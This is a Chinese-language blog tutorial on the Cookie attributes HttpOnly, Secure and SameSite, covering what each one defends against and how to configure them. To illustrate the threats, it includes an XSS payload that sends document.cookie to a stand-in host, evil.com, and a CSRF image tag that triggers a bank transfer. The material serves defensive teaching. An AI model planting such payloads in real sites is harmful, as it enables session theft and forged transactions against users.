---
lastUpdated: true
commentabled: true
recommended: true
title: Cookie 安全三属性
description: HttpOnly、Secure、SameSite 分别防什么？
date: 2026-07-08 14:25:00
pageClass: blog-page-class
cover: /covers/html5.svg
---

Cookie 是 Web 中最古老的状态管理机制，也是前端安全中最容易被忽视的薄弱环节。今天就让我们来一起来复习下 Cookie 的三个属性`HttpOnly`、`Secure`、`SameSite` 分别防什么？为什么缺了任意一个都可能导致安全漏洞？

## Cookie 的“原生裸奔”状态

假设用户登录后，服务端返回这样一个 Cookie：

```txt
Set-Cookie: token=0576221f4cc44e9eb5dc2e029dc50718
```

这个 Cookie 没有任何安全属性。它有三个致命弱点：

- 任何 JavaScript 都能读取它：`document.cookie` 可以轻松拿到 `token`。
- 在 HTTP 明文连接中传输：中间人可以截获它。
- 任何跨站请求都会自动携带它：无论用户是在访问你的网站，还是访问了恶意网站。

这三种弱点分别对应三种攻击：XSS 窃取 Cookie、中间人攻击、CSRF 跨站请求伪造。而 `HttpOnly`、`Secure`、`SameSite` 就是专门为这三个弱点设计的“防弹衣”。

## HttpOnly：防 XSS 窃取 Cookie

### 攻击场景：XSS 注入

攻击者在留言板中注入脚本：

```html
<img
  src="x"
  onerror="fetch('https://evil.com?cookie='+document.cookie)"
/>
```

当其他用户访问这个页面时，脚本自动执行，将当前域名下所有可被 JavaScript 读取的 Cookie 发送到攻击者的服务器。

### 防御机制

`HttpOnly` 标记告诉浏览器：这个 Cookie 只能用于 HTTP 请求，禁止 JavaScript 访问。

```txt
Set-Cookie: token=0576221f4cc44e9eb5dc2e029dc50718; HttpOnly
```

一旦设置，`document.cookie` 将无法读取该 Cookie，即使 XSS 注入成功，攻击者也拿不到登录凭证。

### 局限性

`HttpOnly` 只能防止“读取”，不能防止“使用”。攻击者仍然可以在受害者浏览器中直接发起请求（通过注入的脚本调用 `fetch('/api/transfer', {method:'POST'})`），浏览器会自动带上 HttpOnly Cookie。所以它需要与 SameSite、CSP 等机制配合。

### 前端能做什么？

- 打开 DevTools → Application → Cookies，检查敏感 Cookie 的 `HttpOnly` 列是否打勾。
- 与后端约定：所有认证 Token 必须设置 `HttpOnly`。
- 对于前端自行存储的 Token（如 `localStorage`），不涉及 `HttpOnl`y，此时需要依赖其他 XSS 防御手段。

## Secure：防中间人攻击

### 攻击场景：中间人截获

用户在咖啡厅连接了公共 Wi-Fi，攻击者在同一网络下抓包。如果用户访问的是 HTTP 站点，所有请求和响应（包括 Cookie）都是明文传输，攻击者可以直接读取。

```txt
GET /api/user HTTP/1.1
Host: example.com
Cookie: token=0576221f4cc44e9eb5dc2e029dc50718          ← 明文，攻击者一览无余
```

### 防御机制

Secure 标记告诉浏览器：这个 Cookie 只能在 HTTPS 加密连接中传输。

```ini
Set-Cookie: token=0576221f4cc44e9eb5dc2e029dc50718; Secure
```

即使攻击者能截获网络包，Cookie 也是加密的。如果站点使用 HTTP，浏览器根本不会发送带有 Secure 标记的 Cookie。

### 生产环境建议

- 全站 HTTPS：不只是登录接口，所有页面和资源都应使用 HTTPS。
- HSTS（HTTP Strict Transport Security）：通过响应头告诉浏览器“以后访问我时，只能用 HTTPS，别试 HTTP 了”。

```ini
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

- 本地开发：生产环境配置了 `Secure` 的 Cookie 在 `localhost` 下可能无法发送。可以在开发环境暂时去掉 Secure，或使用 `mkcert` 生成本地 HTTPS 证书。

## SameSite：防 CSRF 跨站请求伪造

### 攻击场景：CSRF

用户登录了 `bank.com`，Cookie 有效。随后用户访问了攻击者的网站 `evil.com`，这个页面里有一张“图片”：

```html
<img src="https://bank.com/transfer?to=hacker&amount=10000" />
```

浏览器在加载这张“图片”时，会自动带上 `bank.com` 的 Cookie，于是转账请求以受害者的身份被执行了。

### 防御机制

SameSite 标记告诉浏览器：这个 Cookie 在跨站请求时，该不该被携带？

它有三个值：

| 值             | 行为                                                                               |
| :------------- | :--------------------------------------------------------------------------------- |
| Strict         | 完全禁止跨站携带。即使从 `evi1.com` 点击一个链接跳转到 `bank.com`，Cookie 也不带。 |
| Lax (推荐默认) | 大部分跨站请求不携带。例如：顶级导航的 GET 请求（如点击链接跳转）会携带。          |
| None           | 所有请求都携带。必须同时设置 Secure，否则浏览器拒绝。                              |

```ini
Set-Cookie: token=0576221f4cc44e9eb5dc2e029dc50718; SameSite=Lax
```

设置为 `Lax` 后，上面的 CSRF 攻击会失效：`<img>` 标签发起的跨站 GET 请求不会携带 Cookie，转账请求无法通过认证。

### 为什么推荐 Lax 而不是 Strict？

Strict 过于严格。如果用户从邮件中点击了一个链接跳转到你的网站，因为这是跨站跳转，Cookie 不会被携带，用户看起来像“未登录”状态，体验很差。Lax 在安全性和可用性之间取得了平衡。

### 什么时候用 None？

如果你的站点需要被嵌入在跨域 iframe 中，或者需要支持第三方登录（OAuth 回调），可能需要设置 `SameSite=None`。但必须同时设置 Secure，否则浏览器会拒绝该 Cookie。

```ini
Set-Cookie: token=0576221f4cc44e9eb5dc2e029dc50718; SameSite=None; Secure
```

### 前端如何检查 SameSite 是否生效？

在 Chrome DevTools 的 Network 面板中，查看请求的 Request Headers，如果 Cookie 没有被发送，且 Response Headers 中有 `Set-Cookie` 但 Application 面板中没看到该 Cookie，很可能是 SameSite 配置问题。

## 组合使用：三道防线缺一不可

一个安全的 Cookie 配置应该同时包含这三个属性：

```ini
Set-Cookie: token=0576221f4cc44e9eb5dc2e029dc50718; HttpOnly; Secure; SameSite=Lax; Max-Age=86400
```

| 属性     | 防什么            | 缺了它会发生什么                                   |
| :------- | :---------------- | :------------------------------------------------- |
| HttpOnly | XSS 窃取 Cookie   | 注入脚本可直接读取 `document.cookie`，登录凭证泄露 |
| Secure   | 中间人攻击        | 明文传输的 Cookie 可被网络嗅探截获                 |
| SameSite | CSRF 跨站请求伪造 | 恶意网站可发起携带 Cookie 的跨站请求               |

三者互相补充，没有哪个是冗余的。即使有 HttpOnly，攻击者仍然可以在受害者浏览器中发起跨站请求；即使有 Secure，攻击者仍然可以利用 XSS 读取 Cookie；即使有 SameSite，攻击者仍然可以在同站环境中利用 XSS。

## JWT Token 存在 Cookie 还是 localStorage？

很多 SPA 项目把 JWT 存在 localStorage，然后通过 Authorization 请求头发送。这种方式的优点是简单，但有一个致命弱点：一旦 XSS 注入成功，攻击者可以直接读取 localStorage 中的 Token，而 localStorage 没有任何保护机制。

存储方案对比：

| 存储方式                            | 优点                        | 缺点                           |
| :---------------------------------- | :-------------------------- | :----------------------------- |
| localStorage                        | 简单，不受 CSRF 威胁        | 无法防 XSS，一旦注入即可读取   |
| HttpOnly Cookie                     | JavaScript 无法读取，防 XSS | 需要防范 CSRF（配合 SameSite） |
| HttpOnly + Secure + SameSite Cookie | 三重防护                    | 需要后端配合，调试稍复杂       |

推荐方案：将 JWT 存储于 `HttpOnly; Secure; SameSite=Lax` 的 Cookie 中，前端无需手动处理 Token，浏览器自动携带。如果必须前端主动发 Token（如跨域请求），确保同时做好 XSS 防御。

## 总结

Cookie 的三个安全属性各司其职，缺一不可：

- HttpOnly：告诉浏览器“这个 Cookie 只给服务器用，JS 别碰”，防 XSS 窃取。
- Secure：告诉浏览器“只在加密连接中传这个 Cookie”，防中间人截获。
- SameSite：告诉浏览器“跨站请求别带这个 Cookie”，防 CSRF 伪造。

我们在写登录逻辑时，不能只关心“用户能登进去”，也要关心“攻击者拿不走”。这三行属性，就是给每个用户颁发的“数字防弹衣”。
